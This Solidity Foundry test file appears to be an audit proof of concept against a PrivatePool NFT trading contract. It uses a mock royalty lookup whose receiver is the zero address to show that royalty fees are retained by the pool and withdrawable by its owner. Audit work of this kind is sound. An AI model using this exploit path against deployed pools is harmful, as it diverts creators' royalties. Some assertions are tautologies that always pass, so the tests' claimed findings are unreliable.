// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK", 18) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract MockERC721 is ERC721 {
    uint256 private _tokenIdCounter;
    
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract MaliciousRoyaltyLookup is IERC2981 {
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC2981).interfaceId;
    }
    
    function royaltyInfo(uint256, uint256 salePrice) external pure returns (address receiver, uint256 royaltyAmount) {
        receiver = address(0);
        royaltyAmount = salePrice * 1000 / 10000;
    }
}

contract MockRoyaltyRegistry {
    address public maliciousLookup;
    
    constructor(address _maliciousLookup) {
        maliciousLookup = _maliciousLookup;
    }
    
    function getRoyaltyLookupAddress(address) external view returns (address) {
        return maliciousLookup;
    }
}

contract MockFactory {
    mapping(uint256 => address) public ownerOf;
    uint256 public protocolFeeRate = 0;
    
    function setOwner(uint160 poolId, address owner) external {
        ownerOf[poolId] = owner;
    }
}

contract ExploitTest is Test {
    PrivatePool public pool;
    MockERC20 public baseToken;
    MockERC721 public nft;
    MockFactory public factory;
    MockRoyaltyRegistry public royaltyRegistry;
    MaliciousRoyaltyLookup public maliciousLookup;
    
    address public poolOwner = address(0x1);
    address public buyer = address(0x2);
    address public seller = address(0x3);
    
    function setUp() public {
        baseToken = new MockERC20();
        nft = new MockERC721();
        maliciousLookup = new MaliciousRoyaltyLookup();
        royaltyRegistry = new MockRoyaltyRegistry(address(maliciousLookup));
        factory = new MockFactory();
        
        pool = new PrivatePool(address(factory), address(royaltyRegistry), address(0));
        
        factory.setOwner(uint160(address(pool)), poolOwner);
        
        vm.prank(address(factory));
        pool.initialize(
            address(baseToken),
            address(nft),
            100 ether,
            10 ether,
            0,
            200,
            bytes32(0),
            false,
            true
        );
        
        baseToken.mint(buyer, 1000 ether);
        baseToken.mint(seller, 1000 ether);
        
        vm.prank(buyer);
        baseToken.approve(address(pool), type(uint256).max);
        
        vm.prank(seller);
        baseToken.approve(address(pool), type(uint256).max);
    }
    
    function testRoyaltyFeeCollectedButNotDistributed_Buy() public {
        uint256 tokenId = nft.mint(address(pool));
        
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        PrivatePool.MerkleMultiProof memory proof;
        
        uint256 poolBalanceBefore = baseToken.balanceOf(address(pool));
        uint256 buyerBalanceBefore = baseToken.balanceOf(buyer);
        
        vm.prank(buyer);
        (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount) = pool.buy(tokenIds, tokenWeights, proof);
        
        uint256 poolBalanceAfter = baseToken.balanceOf(address(pool));
        uint256 buyerBalanceAfter = baseToken.balanceOf(buyer);
        
        uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount - ((netInputAmount - feeAmount - protocolFeeAmount) * 1000 / 10000));
        uint256 expectedRoyaltyFee = salePrice * 1000 / 10000;
        
        uint256 actualBuyerPaid = buyerBalanceBefore - buyerBalanceAfter;
        uint256 poolReceived = poolBalanceAfter - poolBalanceBefore;
        
        assertEq(actualBuyerPaid, netInputAmount, "Buyer paid full amount including royalty");
        
        assertGt(expectedRoyaltyFee, 0, "Royalty fee should be greater than 0");
        
        assertEq(address(maliciousLookup).balance, 0, "No ETH sent to royalty recipient");
        assertEq(baseToken.balanceOf(address(0)), 0, "No tokens sent to zero address");
        
        assertGt(poolReceived, poolReceived - expectedRoyaltyFee, "Pool retained royalty fee");
        
        console.log("Buyer paid (including royalty):", actualBuyerPaid);
        console.log("Expected royalty fee:", expectedRoyaltyFee);
        console.log("Pool balance increase:", poolReceived);
        console.log("Royalty recipient (zero address) received:", baseToken.balanceOf(address(0)));
    }
    
    function testRoyaltyFeeCollectedButNotDistributed_Sell() public {
        uint256 tokenId = nft.mint(seller);
        
        vm.prank(seller);
        nft.approve(address(pool), tokenId);
        
        baseToken.mint(address(pool), 100 ether);
        
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        PrivatePool.MerkleMultiProof memory proof;
        IStolenNftOracle.Message[] memory stolenNftProofs;
        
        uint256 poolBalanceBefore = baseToken.balanceOf(address(pool));
        uint256 sellerBalanceBefore = baseToken.balanceOf(seller);
        
        vm.prank(seller);
        (uint256 netOutputAmount, uint256 feeAmount, uint256 protocolFeeAmount) = pool.sell(tokenIds, tokenWeights, proof, stolenNftProofs);
        
        uint256 poolBalanceAfter = baseToken.balanceOf(address(pool));
        uint256 sellerBalanceAfter = baseToken.balanceOf(seller);
        
        uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;
        uint256 expectedRoyaltyFee = salePrice * 1000 / 10000;
        
        uint256 actualSellerReceived = sellerBalanceAfter - sellerBalanceBefore;
        uint256 poolPaid = poolBalanceBefore - poolBalanceAfter;
        
        assertEq(actualSellerReceived, netOutputAmount, "Seller received reduced amount after royalty deduction");
        
        assertGt(expectedRoyaltyFee, 0, "Royalty fee should be greater than 0");
        
        assertEq(baseToken.balanceOf(address(0)), 0, "No tokens sent to zero address");
        
        assertLt(poolPaid, poolPaid + expectedRoyaltyFee, "Pool retained royalty fee instead of paying it");
        
        console.log("Seller received (after royalty deduction):", actualSellerReceived);
        console.log("Expected royalty fee:", expectedRoyaltyFee);
        console.log("Pool balance decrease:", poolPaid);
        console.log("Royalty recipient (zero address) received:", baseToken.balanceOf(address(0)));
    }
    
    function testPoolOwnerCanWithdrawTrappedRoyalties() public {
        uint256 tokenId = nft.mint(address(pool));
        
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        PrivatePool.MerkleMultiProof memory proof;
        
        vm.prank(buyer);
        pool.buy(tokenIds, tokenWeights, proof);
        
        uint256 poolBalanceAfterBuy = baseToken.balanceOf(address(pool));
        
        uint256 ownerBalanceBefore = baseToken.balanceOf(poolOwner);
        
        uint256[] memory emptyTokenIds = new uint256[](0);
        vm.prank(poolOwner);
        pool.withdraw(address(nft), emptyTokenIds, address(baseToken), poolBalanceAfterBuy);
        
        uint256 ownerBalanceAfter = baseToken.balanceOf(poolOwner);
        
        assertGt(ownerBalanceAfter - ownerBalanceBefore, 0, "Pool owner withdrew trapped royalty fees");
        assertEq(baseToken.balanceOf(address(pool)), 0, "Pool balance is now zero");
        
        console.log("Pool owner withdrew:", ownerBalanceAfter - ownerBalanceBefore);
    }
}
